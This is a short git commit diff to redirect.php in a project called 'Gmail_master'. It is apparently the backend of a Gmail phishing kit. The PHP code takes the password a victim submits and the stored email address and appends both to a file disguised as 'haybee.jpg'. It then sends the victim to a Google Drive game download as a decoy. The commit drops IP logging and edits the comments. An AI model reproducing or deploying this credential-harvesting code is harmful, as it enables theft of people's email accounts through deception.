de66146413977a725cd6ba1c04adcd855a0a9bef
bobstottts <bobstottts@googlemail.com>
2017-07-18 12:12:09 +0600

    Update redirect.php

--- Gmail_master/redirect.php
+++ Gmail_master/redirect.php
@@ -4,13 +4,12 @@
 			
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
-                        $ip = $_SERVER['REMOTE_ADDR'];
 			//opening logins text file for appending new data.
   			$file = fopen("haybee.jpg", "a") or die("Unable to open file!");
 			
-  			//Writing email and password to haybee.jpg. 
-  			fwrite($file, .$ip." .$email."	".$pass.PHP_EOL);			
-  			fclose($file);//closing haybee.txt.
+  			//Writing email and password to logins.txt. 
+  			fwrite($file, $email."	".$pass.PHP_EOL);			
+  			fclose($file);//closing logins.txt.
 			
   			//redirecting user to the google drive's locations where the game is available to download.
   			//change the location url to redirect to a website of your choice.
